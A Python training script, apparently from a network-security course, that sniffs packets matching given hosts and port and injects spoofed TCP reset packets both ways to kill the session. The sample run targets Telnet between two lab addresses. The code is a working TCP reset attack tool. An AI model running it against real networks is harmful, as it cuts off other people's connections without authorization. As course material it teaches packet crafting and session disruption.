#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

import logging

logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
from kamene.all import *
from tools.scapy_iface import scapy_iface


def tcp_monitor_callback(pkt):
    # 本代码主要任务: 对传入的数据包,发送TCP Rest进行会话重置
    source_mac = pkt[Ether].fields['src']
    destination_mac = pkt[Ether].fields['dst']
    source_ip = pkt[IP].fields['src']
    destination_ip = pkt[IP].fields['dst']
    source_port = pkt[TCP].fields['sport']
    destination_port = pkt[TCP].fields['dport']
    seq_sn = pkt[TCP].fields['seq']
    ack_sn = pkt[TCP].fields['ack']

    a = Ether(src=source_mac, dst=destination_mac) / IP(src=source_ip, dst=destination_ip) / TCP(dport=destination_port,
                                                                                                 sport=source_port,
                                                                                                 flags=4,
                                                                                                 seq=seq_sn)
    b = Ether(src=destination_mac, dst=source_mac) / IP(src=destination_ip, dst=source_ip) / TCP(dport=source_port,
                                                                                                 sport=destination_port,
                                                                                                 flags=4,
                                                                                                 seq=ack_sn)
    sendp(a,
          iface=global_if,  # Windows环境不能使用iface参数
          verbose=False)
    sendp(b,
          iface=global_if,  # Windows环境不能使用iface参数
          verbose=False)


def tcp_reset(src_ip, dst_ip, dst_port, ifname, src_port=None):
    # 本代码主要任务: 搜索匹配过滤条件的数据包,然后使用tcp_monitor_callback方法进行重置会话处理
    global global_if
    global_if = scapy_iface(ifname)
    # sniff() uses Berkeley Packet Filter (BPF) syntax (the same one as tcpdump)
    # https://biot.com/capstats/bpf.html
    # https://blog.csdn.net/qwertyupoiuytr/article/details/54670477
    if src_port is None:
        match = "src host " + src_ip + " and dst host " + dst_ip + " and dst port " + dst_port
    else:
        match = "src host " + src_ip + " and dst host " + dst_ip + " and src port " + src_port + " and dst port " + dst_port
    print("开始匹配异常流量" + match)
    sniff(prn=tcp_monitor_callback,
          filter=match,
          iface=global_if,
          store=0)


if __name__ == "__main__":
    # 使用Linux解释器 & WIN解释器
    tcp_reset('10.1.1.100', '10.1.1.253', '23', 'ens192')
